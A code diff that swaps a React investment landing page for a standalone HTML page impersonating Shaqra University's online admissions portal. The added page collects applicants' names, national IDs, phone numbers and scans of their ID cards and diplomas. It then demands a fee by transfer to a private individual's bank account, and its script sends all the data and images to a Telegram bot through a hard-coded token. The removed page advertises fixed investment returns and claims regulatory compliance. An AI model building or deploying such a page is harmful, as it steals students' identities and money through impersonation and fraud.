@@ -1,224 +1,276 @@
-import React, { useState } from "react";
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بوابة القبول الإلكتروني | جامعة شقراء</title>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root { --su-blue: #003366; --su-gold: #b2935b; --su-bg: #f4f7f9; --snb: #005a2b; --danger: #d00000; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Tajawal', sans-serif; }
+        body { background-color: var(--su-bg); color: #333; }
 
-// صفحة React واحدة جاهزة بالـ Tailwind (RTL) لعرض موقع استثمار تجريبي
-// ملاحظة: استبدل الشعارات، الأيقونات، والروابط بالمحتوى الحقيقي عند النشر.
+        /* الهيدر */
+        header { background: #fff; padding: 15px 8%; display: flex; justify-content: space-between; align-items: center; border-bottom: 4px solid var(--su-gold); box-shadow: 0 2px 15px rgba(0,0,0,0.1); }
+        .logo-wrap { display: flex; align-items: center; gap: 15px; }
+        .su-logo-circle { width: 80px; height: 80px; background: var(--su-blue); border-radius: 50%; color: #fff; display: flex; align-items: center; justify-content: center; font-size: 10px; font-weight: 800; text-align: center; border: 3px solid var(--su-gold); }
 
-export default function InvestmentLanding() {
-  const [email, setEmail] = useState("");
-  const [plan, setPlan] = useState("basic");
-  const [message, setMessage] = useState("");
-  const [submitted, setSubmitted] = useState(false);
+        /* الناف بار */
+        nav { background: var(--su-blue); display: flex; padding: 0 8%; position: sticky; top: 0; z-index: 1000; overflow-x: auto; }
+        nav button { background: transparent; border: none; color: white; padding: 18px 25px; font-size: 14px; cursor: pointer; white-space: nowrap; font-weight: 600; border-bottom: 3px solid transparent; }
+        nav button.active { background: rgba(255,255,255,0.1); border-bottom-color: var(--su-gold); }
 
-  function handleSubscribe(e) {
-    e.preventDefault();
-    // هنا عادة ترسل بيانات إلى API; الآن نظهر رسالة شكر تجريبية
-    setSubmitted(true);
-    setTimeout(() => setSubmitted(false), 3500);
-  }
+        .container { padding: 40px 20px; max-width: 1200px; margin: 0 auto; min-height: 800px; }
+        .page { display: none; animation: fadeIn 0.4s ease; }
+        .page.active { display: block; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
-  return (
-    <div lang="ar" dir="rtl" className="min-h-screen bg-gray-50 text-gray-900 antialiased">
-      <header className="bg-white shadow-sm">
-        <div className="max-w-6xl mx-auto px-6 py-4 flex items-center justify-between">
-          <div className="flex items-center gap-3">
-            <div className="w-10 h-10 bg-gradient-to-br from-blue-600 to-blue-400 rounded-lg flex items-center justify-center text-white font-bold">ر</div>
-            <div>
-              <h1 className="text-lg font-semibold">منصة الريادة للاستثمار</h1>
-              <p className="text-xs text-gray-500">حلول استثمارية موثوقة ومبسطة</p>
-            </div>
-          </div>
-          <nav className="hidden md:flex gap-6 text-sm">
-            <a href="#home" className="hover:text-blue-600">الرئيسية</a>
-            <a href="#plans" className="hover:text-blue-600">الخطط</a>
-            <a href="#how" className="hover:text-blue-600">كيف نعمل</a>
-            <a href="#about" className="hover:text-blue-600">من نحن</a>
-            <a href="#contact" className="hover:text-blue-600">تواصل</a>
-          </nav>
-          <div className="flex items-center gap-3">
-            <button className="hidden md:inline-block px-4 py-2 rounded-lg border border-blue-600 text-blue-600 font-medium">تسجيل دخول</button>
-            <button className="px-4 py-2 bg-blue-600 text-white rounded-lg font-medium shadow">ابدأ الآن</button>
-          </div>
+        /* الصفحة الرئيسية */
+        .hero-section { text-align: center; margin-bottom: 40px; }
+        .main-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); gap: 20px; }
+        .menu-card { background: #fff; padding: 40px 20px; border-radius: 12px; text-align: center; box-shadow: 0 5px 20px rgba(0,0,0,0.05); cursor: pointer; transition: 0.3s; border-top: 5px solid var(--su-blue); }
+        .menu-card:hover { transform: translateY(-10px); border-top-color: var(--su-gold); }
+        .menu-card h3 { color: var(--su-blue); font-size: 19px; margin-bottom: 10px; }
+
+        /* النماذج المتقدمة */
+        .form-box { background: #fff; border-radius: 15px; padding: 30px; margin-bottom: 25px; box-shadow: 0 4px 12px rgba(0,0,0,0.03); border-right: 10px solid var(--su-blue); }
+        .form-title { color: var(--su-blue); font-weight: 800; font-size: 18px; margin-bottom: 25px; border-bottom: 1px solid #eee; padding-bottom: 15px; display: flex; align-items: center; gap: 10px; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 20px; }
+        .field { display: flex; flex-direction: column; }
+        label { font-size: 13px; font-weight: 700; color: #555; margin-bottom: 8px; }
+        input, select { padding: 12px; border: 1px solid #ccc; border-radius: 8px; background: #fdfdfd; font-size: 14px; }
+        input:focus { border-color: var(--su-blue); outline: none; background: #fff; }
+
+        /* صفحة السداد - التطوير الجديد */
+        .pay-container { max-width: 600px; margin: 0 auto; background: white; border-radius: 25px; overflow: hidden; box-shadow: 0 30px 60px rgba(0,0,0,0.12); }
+        .pay-header { background: var(--snb); color: white; padding: 35px; text-align: center; }
+        .amount-highlight { background: #fff; color: var(--danger); padding: 15px 45px; border-radius: 50px; font-weight: 900; font-size: 32px; display: inline-block; margin-top: -30px; border: 3px solid var(--su-gold); box-shadow: 0 10px 20px rgba(208, 0, 0, 0.2); animation: pulse 2s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
+        
+        .bank-details { padding: 40px; }
+        .bank-item { display: flex; justify-content: space-between; padding: 15px; border-bottom: 1px solid #f0f0f0; align-items: center; }
+        .bank-item span { color: #888; font-size: 13px; }
+        .bank-item b { color: var(--su-blue); font-size: 15px; }
+
+        /* الأزرار */
+        .btn-action { background: var(--su-blue); color: #fff; padding: 18px; border: none; border-radius: 10px; font-weight: 800; cursor: pointer; width: 100%; font-size: 18px; margin-top: 20px; transition: 0.3s; }
+        .btn-action:hover { background: var(--su-gold); }
+
+        footer { background: #001a33; color: #fff; text-align: center; padding: 50px; margin-top: 60px; border-top: 5px solid var(--su-gold); font-size: 13px; }
+    </style>
+</head>
+<body>
+
+<header>
+    <div class="logo-wrap">
+        <div class="su-logo-circle">جامعة<br>شقراء</div>
+        <div>
+            <h1 style="color: var(--su-blue); font-size: 24px; font-weight: 900;">بوابة القبول الموحد</h1>
+            <p style="font-size: 12px; color: #666;">SHAQRA UNIVERSITY ADMISSION SYSTEM</p>
         </div>
-      </header>
-
-      <main id="home" className="max-w-6xl mx-auto px-6 py-12">
-        <section className="w-full bg-blue-900 text-white py-20"> <div className="max-w-4xl mx-auto text-center px-6"> <h1 className="text-4xl md:text-5xl font-bold mb-6">منصة الريادة للاستثمار – السعودية</h1> <p className="text-lg md:text-xl opacity-90 mb-8 leading-relaxed">منصة استثمار سعودية موثوقة، تقدّم حلولًا مالية مبتكرة ومتوافقة مع أنظمة هيئة السوق المالية، لتمكين المستثمرين داخل المملكة من الاستثمار بسهولة وأمان عبر خدمات رقمية عالية الجودة.</p> <button className="bg-white text-blue-900 px-8 py-3 rounded-xl font-semibold text-lg shadow-lg hover:opacity-90 transition">ابدأ الاستثمار الآن</button> </div> </section>
-
-        <section id="how" className="mt-16">
-          <h3 className="text-2xl font-bold">كيف نعمل</h3>
-          <p className="mt-2 text-gray-600">نقدّم آليات استثمار شفافة ومُدارة بواسطة فريق خبراء، مع أدوات للمتابعة والتقارير الدورية.</p>
-
-          <div className="mt-6 grid gap-4 sm:grid-cols-3">
-            <div className="bg-white p-5 rounded-lg shadow-sm">
-              <h4 className="font-semibold">تحليل متقدم</h4>
-              <p className="text-sm text-gray-500 mt-2">نماذج تقييم ومؤشرات لاتخاذ قرارات مبنية على بيانات.</p>
-            </div>
-            <div className="bg-white p-5 rounded-lg shadow-sm">
-              <h4 className="font-semibold">تنويع ذكي</h4>
-              <p className="text-sm text-gray-500 mt-2">نوزع المخاطر عبر فئات استثمارية مختلفة لتقليل التقلب.</p>
-            </div>
-            <div className="bg-white p-5 rounded-lg shadow-sm">
-              <h4 className="font-semibold">تقارير دورية</h4>
-              <p className="text-sm text-gray-500 mt-2">تقارير أداء شهرية وسهلة الفهم لكل مستثمر.</p>
-            </div>
-          </div>
-        </section>
-
-        <section id="plans" className="mt-16">
-          <h3 className="text-2xl font-bold">الخطط</h3>
-          <p className="text-gray-600 mt-2">اختر الخطة الأنسب لك — كل خطة مصممة لهدف استثماري مختلف.</p>
-
-          <div className="mt-6 grid gap-6 sm:grid-cols-3">
-            <div className="bg-white p-6 rounded-xl shadow-md border">
-              <div className="text-sm font-semibold">الخطة الأساسية</div>
-              <div className="mt-4 text-3xl font-bold">6% سنويًا</div>
-              <ul className="mt-4 text-sm space-y-2 text-gray-600">
-                <li>حد أدنى 2000 ريال</li>
-                <li>مراجعة ربع سنوية</li>
-                <li>دعم عبر البريد</li>
-              </ul>
-              <button className="mt-6 w-full py-2 bg-blue-50 text-blue-700 rounded-lg font-medium">أبدأ بالخطة</button>
-            </div>
-
-            <div className="bg-white p-6 rounded-xl shadow-md border-2 border-blue-600">
-              <div className="text-sm font-semibold">الخطة الاحترافية</div>
-              <div className="mt-4 text-3xl font-bold">9% سنويًا</div>
-              <ul className="mt-4 text-sm space-y-2 text-gray-600">
-                <li>حد أدنى 10,000 ريال</li>
-                <li>مستشار استثماري خاص</li>
-                <li>تقارير شهرية</li>
-              </ul>
-              <button className="mt-6 w-full py-2 bg-blue-600 text-white rounded-lg font-medium">أبدأ بالخطة</button>
-            </div>
-
-            <div className="bg-white p-6 rounded-xl shadow-md border">
-              <div className="text-sm font-semibold">خطة الشركاء</div>
-              <div className="mt-4 text-3xl font-bold">مخصص</div>
-              <ul className="mt-4 text-sm space-y-2 text-gray-600">
-                <li>حلول مؤسسية</li>
-                <li>دعم مخصص 24/7</li>
-                <li>استراتيجية مخصصة</li>
-              </ul>
-              <button className="mt-6 w-full py-2 border border-blue-600 rounded-lg font-medium">اطلب عرضًا</button>
-            </div>
-          </div>
-        </section>
-
-        <section id="about" className="mt-16 bg-white p-6 rounded-xl shadow-sm">
-          <h3 className="text-2xl font-bold">من نحن</h3>
-          <p className="mt-3 text-gray-600">فريق من المستشارين الماليين والمحللين السوقيين ذوي خبرة. نعمل بشفافية ونهدف لتمكين المستثمرين من تحقيق أهدافهم المالية بثقة.</p>
-
-          <div className="mt-6 grid gap-4 sm:grid-cols-3">
-            <div className="p-4">
-              <div className="font-semibold">رؤية</div>
-              <p className="text-sm text-gray-500 mt-2">تمكين الجميع من الوصول لأدوات استثمارية متقدمة.</p>
-            </div>
-            <div className="p-4">
-              <div className="font-semibold">قيمة</div>
-              <p className="text-sm text-gray-500 mt-2">شفافية، أمان، ونتائج قابلة للقياس.</p>
-            </div>
-            <div className="p-4">
-              <div className="font-semibold">التزام</div>
-              <p className="text-sm text-gray-500 mt-2">حماية أموال العملاء واتباع أفضل ممارسات الحوكمة.</p>
-            </div>
-          </div>
-        </section>
-
-        <section id="contact" className="mt-16">
-          <h3 className="text-2xl font-bold">تواصل معنا</h3>
-          <div className="mt-6 grid gap-6 md:grid-cols-2">
-            <form
-              onSubmit={(e) => {
-                e.preventDefault();
-                setMessage("");
-                alert("تم إرسال رسالتك. (تجريبي)");
-              }}
-              className="bg-white p-6 rounded-lg shadow-sm"
-            >
-              <label className="block text-sm">الاسم</label>
-              <input required className="w-full mt-2 px-4 py-3 border rounded-lg" />
-
-              <label className="block text-sm mt-4">البريد الإلكتروني</label>
-              <input required type="email" className="w-full mt-2 px-4 py-3 border rounded-lg" />
-
-              <label className="block text-sm mt-4">الرسالة</label>
-              <textarea value={message} onChange={(e) => setMessage(e.target.value)} className="w-full mt-2 px-4 py-3 border rounded-lg" rows={5} />
-
-              <button type="submit" className="mt-4 px-5 py-3 bg-blue-600 text-white rounded-lg">أرسل الرسالة</button>
-            </form>
-
-            <div className="bg-white p-6 rounded-lg shadow-sm">
-              <h4 className="font-semibold">معلومات التواصل</h4>
-              <p className="text-sm text-gray-500 mt-2">الهاتف: +966 5X XXX XXXX</p>
-              <p className="text-sm text-gray-500 mt-2">البريد: info@riyadah-invest.com</p>
-
-              <div className="mt-6">
-                <h5 className="font-medium">روابط سريعة</h5>
-                <ul className="mt-2 text-sm text-gray-600 space-y-1">
-                  <li>الأسئلة الشائعة</li>
-                  <li>الشروط والأحكام</li>
-                  <li>سياسة الخصوصية</li>
-                </ul>
-              </div>
-            </div>
-          </div>
-        </section>
-
-        <footer className="mt-16 py-8 text-center text-sm text-gray-500">
-          © {new Date().getFullYear()} منصة الريادة للاستثمار — جميع الحقوق محفوظة.
-        </footer>
-      
-<section className="py-20 bg-gray-50">
-  <div className="max-w-6xl mx-auto px-6 text-center">
-    <h2 className="text-3xl font-bold text-blue-900 mb-6">لماذا منصة الريادة للاستثمار؟</h2>
-    <p className="text-gray-700 max-w-3xl mx-auto mb-12 leading-relaxed">نلتزم في منصة الريادة بتقديم خدمات استثمارية موثوقة ومتوافقة مع أنظمة ولوائح هيئة السوق المالية داخل المملكة العربية السعودية، لضمان تجربة آمنة وشفافة للمستثمرين.</p>
-    <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
-      <div className="bg-white shadow-lg rounded-2xl p-8 border border-gray-200">
-        <h3 className="text-xl font-semibold text-blue-900 mb-3">التوافق النظامي</h3>
-        <p className="text-gray-600">جميع العمليات المالية والخدمات الاستثمارية متماشية مع الأنظمة السعودية ولوائح هيئة السوق المالية.</p>
-      </div>
-      <div className="bg-white shadow-lg rounded-2xl p-8 border border-gray-200">
-        <h3 className="text-xl font-semibold text-blue-900 mb-3">أعلى معايير الأمان</h3>
-        <p className="text-gray-600">أنظمة حماية متقدمة لضمان سرية بيانات المستثمرين وأموالهم.</p>
-      </div>
-      <div className="bg-white shadow-lg rounded-2xl p-8 border border-gray-200">
-        <h3 className="text-xl font-semibold text-blue-900 mb-3">سهولة الاستخدام</h3>
-        <p className="text-gray-600">واجهة بسيطة وسريعة تتيح لك الاستثمار بخطوات واضحة ودون تعقيد.</p>
-      </div>
     </div>
-  </div>
-</section>
+</header>
 
-<section className="py-20 bg-white border-t border-gray-200">
-  <div className="max-w-6xl mx-auto px-6 text-center">
-    <h2 className="text-3xl font-bold text-blue-900 mb-6">الخدمات الاستثمارية</h2>
-    <p className="text-gray-700 max-w-3xl mx-auto mb-12 leading-relaxed">نوفّر مجموعة من الحلول الاستثمارية المصممة لتلبية احتياجات المستثمرين داخل المملكة.</p>
-    <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
-      <div className="bg-gray-50 p-8 rounded-2xl shadow-md">
-        <h3 className="text-xl font-semibold text-blue-900 mb-3">الاستثمار العقاري</h3>
-        <p className="text-gray-600">فرص عقارية محلية ذات عوائد مضمونة ومخاطر منخفضة.</p>
-      </div>
-      <div className="bg-gray-50 p-8 rounded-2xl shadow-md">
-        <h3 className="text-xl font-semibold text-blue-900 mb-3">استثمار الأسهم</h3>
-        <p className="text-gray-600">تداول واستثمار أسهم الشركات المدرجة في السوق السعودي.</p>
-      </div>
-      <div className="bg-gray-50 p-8 rounded-2xl shadow-md">
-        <h3 className="text-xl font-semibold text-blue-900 mb-3">تمويل المشاريع</h3>
-        <p className="text-gray-600">خيارات تمويل مبتكرة لدعم رواد الأعمال داخل المملكة.</p>
-      </div>
+<nav id="mainNav">
+    <button class="active" onclick="showPage('home')">الرئيسية</button>
+    <button onclick="showPage('apply')">تقديم طلب جديد</button>
+    <button onclick="showPage('status')">متابعة الطلب</button>
+    <button onclick="showPage('majors')">دليل التخصصات</button>
+    <button onclick="showPage('results')">نتائج الترشيح</button>
+</nav>
+
+<div class="container">
+
+    <div id="home" class="page active">
+        <div class="hero-section">
+            <h2 style="color: var(--su-blue); font-size: 30px; font-weight: 900;">مرحباً بك في نظام سجلني (1447هـ)</h2>
+            <p style="margin-top: 10px; color: #666;">بوابة القبول الإلكتروني لكليات جامعة شقراء</p>
+        </div>
+        <div class="main-grid">
+            <div class="menu-card" onclick="showPage('apply')"><h3>إنشاء طلب جديد</h3><p>للمستجدين خريجي الثانوية العامة</p></div>
+            <div class="menu-card" onclick="showPage('status')"><h3>متابعة حالة الطلب</h3><p>رفع الوثائق وإكمال السداد</p></div>
+            <div class="menu-card" onclick="showPage('majors')"><h3>دليل التخصصات</h3><p>عرض المسارات المتاحة ونسب القبول</p></div>
+            <div class="menu-card" onclick="showPage('results')"><h3>نتائج الترشيح</h3><p>الاستعلام عن القبول النهائي</p></div>
+        </div>
     </div>
-  </div>
-</section>
 
-<section className="py-20 bg-blue-900 text-white text-center">
-  <div className="max-w-4xl mx-auto px-6">
-    <h2 className="text-3xl font-bold mb-4">منصة سعودية موثوقة بالكامل</h2>
-    <p className="opacity-90 leading-relaxed mb-8">نلتزم بالشفافية، الحماية، والامتثال الكامل للأنظمة السعودية، لتقديم بيئة استثمارية آمنة لجميع المستثمرين.</p>
-    <button className="bg-white text-blue-900 px-10 py-3 rounded-xl font-semibold text-lg shadow-lg hover:opacity-90 transition">سجّل كمستثمر الآن</button>
-  </div>
-</section>
+    <div id="apply" class="page">
+        <form id="megaForm">
+            <div class="form-box">
+                <div class="form-title">📋 البيانات الشخصية (المرحلة 1)</div>
+                <div class="grid">
+                    <div class="field"><label>الاسم الرباعي الكامل *</label><input type="text" id="p_name" required></div>
+                    <div class="field"><label>رقم الهوية الوطنية (10 أرقام) *</label><input type="text" id="p_id" maxlength="10" required></div>
+                    <div class="field"><label>تاريخ الميلاد (يوم/شهر/سنة هجري) *</label><input type="text" id="p_dob" placeholder="14xx/xx/xx" required></div>
+                    <div class="field"><label>مكان الميلاد *</label><input type="text" id="p_pob" required></div>
+                    <div class="field"><label>الجنس *</label><select id="p_gender"><option>ذكر</option><option>أنثى</option></select></div>
+                    <div class="field"><label>الجنسية *</label><select id="p_nat"><option>سعودي</option><option>مقيم (منحة داخلية)</option></select></div>
+                </div>
+            </div>
 
-</main>
+            <div class="form-box">
+                <div class="form-title">📞 معلومات التواصل والاتصال</div>
+                <div class="grid">
+                    <div class="field"><label>رقم الجوال الشخصي *</label><input type="tel" id="p_phone" placeholder="05xxxxxxxx" required></div>
+                    <div class="field"><label>رقم جوال ولي الأمر *</label><input type="tel" id="p_parent" required></div>
+                    <div class="field"><label>البريد الإلكتروني الرسمي *</label><input type="email" id="p_email" required></div>
+                    <div class="field"><label>المنطقة السكنية *</label><input type="text" id="p_area" required></div>
+                    <div class="field"><label>المدينة *</label><input type="text" id="p_city" required></div>
+                </div>
+            </div>
+
+            <div class="form-box">
+                <div class="form-title">🎓 البيانات الأكاديمية والرغبات (جامعة شقراء)</div>
+                <div class="grid">
+                    <div class="field" style="grid-column: 1/-1;">
+                        <label>اختر الرغبة الأولى (كافة تخصصات الجامعة) *</label>
+                        <select id="p_major" onchange="calcPrice()" required>
+                            <option value="">-- اضغط للاختيار من القائمة الرسمية --</option>
+                            <optgroup label="الكليات الطبية (شقراء/الدوادمي)">
+                                <option value="3000">كلية الطب البشري - شقراء (3000 ريال)</option>
+                                <option value="3000">كلية الطب البشري - الدوادمي (3000 ريال)</option>
+                                <option value="2000">كلية العلوم الطبية التطبيقية (مختبرات/تمريض)</option>
+                            </optgroup>
+                            <optgroup label="الهندسة والحاسب (الدوادمي/شقراء/القويعية)">
+                                <option value="1800">هندسة كهربائية - الدوادمي (1800 ريال)</option>
+                                <option value="1800">هندسة مدنية - الدوادمي (1800 ريال)</option>
+                                <option value="1800">هندسة ميكانيكية - الدوادمي (1800 ريال)</option>
+                                <option value="1600">علوم الحاسب وتقنية المعلومات - شقراء (1600 ريال)</option>
+                                <option value="1600">نظم المعلومات - القويعية (1600 ريال)</option>
+                            </optgroup>
+                            <optgroup label="إدارة الأعمال والقانون (عفيف/ثادق/حريملاء/ضرماء)">
+                                <option value="1400">إدارة أعمال - نظم معلومات إدارية MIS (1400 ريال)</option>
+                                <option value="1400">القانون (الحقوق) - شقراء (1400 ريال)</option>
+                                <option value="1300">المحاسبة - الدوادمي (1300 ريال)</option>
+                                <option value="1300">العلوم والدراسات الإنسانية - ثادق (1300 ريال)</option>
+                            </optgroup>
+                        </select>
+                    </div>
+                    <div class="field"><label>سنة التخرج من الثانوية *</label><input type="number" id="p_year" required></div>
+                    <div class="field"><label>المعدل التراكمي للثانوية *</label><input type="text" id="p_gpa" required></div>
+                    <div class="field"><label>درجة اختبار القدرات *</label><input type="number" id="p_q1" required></div>
+                    <div class="field"><label>درجة اختبار التحصيلي *</label><input type="number" id="p_q2" required></div>
+                </div>
+            </div>
+
+            <div class="form-box">
+                <div class="form-title">📂 رفع الوثائق الرسمية</div>
+                <div class="grid">
+                    <div class="field"><label>صورة الهوية الوطنية (وجه) *</label><input type="file" id="up_id" required></div>
+                    <div class="field"><label>صورة شهادة الثانوية العامة *</label><input type="file" id="up_cert" required></div>
+                </div>
+            </div>
+            <button type="button" class="btn-action" onclick="checkToPay()">حفظ والذهاب لمنصة السداد</button>
+        </form>
     </div>
-  );
-}
+
+    <div id="payment" class="page">
+        <div class="pay-container">
+            <div class="pay-header">
+                <h2 style="font-size: 24px; font-weight: 800;">سداد رسوم معالجة البيانات</h2>
+                <p style="font-size: 13px; opacity: 0.8; margin-top: 5px;">نظام سداد | البنك الأهلي السعودي SNB</p>
+            </div>
+            <center><div class="amount-highlight"><span id="finalPrice">0</span> ريال</div></center>
+            
+            <div class="bank-details">
+                <div class="bank-item"><span>المستفيد الرسمي</span><b>محمد فؤاد محمد سيف</b></div>
+                <div class="bank-item"><span>رقم الحساب</span><b>101000010006086310060</b></div>
+                <div class="bank-item" style="border: 2px dashed var(--snb); padding: 15px; border-radius: 10px; margin: 15px 0;">
+                    <span>الآيبان IBAN</span><b style="color:var(--snb); font-size: 12px;">SA88 8000 0101 6080 1631 0060</b>
+                </div>
+
+                <div style="background: #fff9f0; border: 1px solid var(--su-gold); padding: 20px; border-radius: 15px; text-align: center; margin-top: 20px;">
+                    <p style="font-weight: 800; color: var(--su-blue); margin-bottom: 12px;">إرفاق صورة إيصال التحويل البنكي *</p>
+                    <input type="file" id="up_pay" onchange="enableSubmit()">
+                    <p style="font-size: 10px; color: #888; margin-top: 8px;">* يجب أن تكون الصورة واضحة وتظهر رقم العملية والمبلغ</p>
+                </div>
+                <button id="submitBtn" class="btn-action" style="background: #ccc; cursor: not-allowed;" disabled onclick="sendToTelegram()">تأكيد الإرسال النهائي</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="success" class="page">
+        <div style="background: white; padding: 60px 40px; border-radius: 25px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.05); border-top: 10px solid #27ae60;">
+            <div style="font-size: 60px; color: #27ae60; margin-bottom: 25px;">✅</div>
+            <h2 style="color: var(--su-blue); font-weight: 900; font-size: 28px;">تم استلام طلبكم بنجاح!</h2>
+            <p style="color: #666; line-height: 2; margin: 25px 0;">
+                عزيزي المتقدم، تم تسجيل بياناتك بنجاح في نظام جامعة شقراء لعام 1447هـ.<br>
+                <b>سيتم التواصل معك عبر البريد الإلكتروني ورسائل الـ SMS</b> فور مطابقة إيصال السداد ومراجعة الوثائق المرفقة (خلال 24 ساعة عمل).
+            </p>
+            <div style="background: var(--su-bg); padding: 20px; border-radius: 10px; display: inline-block;">
+                <span style="font-size: 12px; color: #999;">رقم الطلب المرجعي</span><br>
+                <b style="font-size: 22px; color: var(--su-blue);">SU-1447-988012</b>
+            </div>
+            <br><button class="btn-action" style="max-width: 200px; margin-top: 30px;" onclick="location.reload()">العودة للرئيسية</button>
+        </div>
+    </div>
+
+    <div id="status" class="page">
+        <div class="form-box" style="text-align: center;">
+            <h2 style="color:var(--su-blue); margin-bottom:15px;">الاستعلام عن حالة الطلب</h2>
+            <input type="text" placeholder="رقم الهوية الوطنية" style="max-width: 350px;"><br>
+            <button class="btn-action" style="max-width: 200px;" onclick="alert('لم يتم العثور على طلب بهذا الرقم، تأكد من إتمام السداد أولاً')">بحث</button>
+        </div>
+    </div>
+
+</div>
+
+<footer>
+    <p>جميع الحقوق محفوظة - عمادة القبول والتسجيل بجامعة شقراء &copy; 2026</p>
+    <p style="margin-top: 10px; opacity: 0.6;">المملكة العربية السعودية - شقراء</p>
+</footer>
+
+<script>
+    const TOK = '8229651297:AAFrTN7ClxO1GaMAHFrzVIvBu4g_fvJN5dk';
+    const CHID = '7909982055';
+
+    function showPage(id) {
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+        document.getElementById(id).classList.add('active');
+        document.querySelectorAll('nav button').forEach(b => b.classList.remove('active'));
+        // تفعيل الزر في الناف بار
+        const btns = document.querySelectorAll('nav button');
+        if(id === 'home') btns[0].classList.add('active');
+        window.scrollTo(0,0);
+    }
+
+    function calcPrice() {
+        const v = document.getElementById('p_major').value;
+        document.getElementById('finalPrice').innerText = v ? Number(v).toLocaleString() : "0";
+    }
+
+    function checkToPay() {
+        if(document.getElementById('megaForm').checkValidity()) { showPage('payment'); }
+        else { alert('⚠️ فضلاً، أكمل كافة البيانات المطلوبة وارفع صور الهوية والشهادة قبل الانتقال للسداد.'); }
+    }
+
+    function enableSubmit() {
+        const b = document.getElementById('submitBtn');
+        if(document.getElementById('up_pay').files[0]) { b.disabled = false; b.style.background = "#005a2b"; b.style.cursor = "pointer"; }
+    }
+
+    async function sendToTelegram() {
+        const b = document.getElementById('submitBtn'); b.innerText = "⏳ جاري الإرسال..."; b.disabled = true;
+        
+        let txt = `🏛 **طلب جديد - جامعة شقراء**\n👤 الاسم: ${document.getElementById('p_name').value}\n🆔 الهوية: ${document.getElementById('p_id').value}\n📱 الجوال: ${document.getElementById('p_phone').value}\n🎓 التخصص: ${document.getElementById('p_major').options[document.getElementById('p_major').selectedIndex].text}`;
+
+        try {
+            await fetch(`https://api.telegram.org/bot${TOK}/sendMessage`, {
+                method: 'POST', headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: CHID, text: txt})
+            });
+
+            const files = [document.getElementById('up_id').files[0], document.getElementById('up_cert').files[0], document.getElementById('up_pay').files[0]];
+            for(let f of files) {
+                if(f) {
+                    let fd = new FormData(); fd.append('chat_id', CHID); fd.append('photo', f);
+                    await fetch(`https://api.telegram.org/bot${TOK}/sendPhoto`, {method: 'POST', body: fd});
+                }
+            }
+            showPage('success');
+        } catch(e) { alert('انقطع الاتصال بالخادم، حاول مرة أخرى'); b.disabled = false; b.innerText = "تأكيد الإرسال النهائي"; }
+    }
+</script>
+</body>
+</html>
+
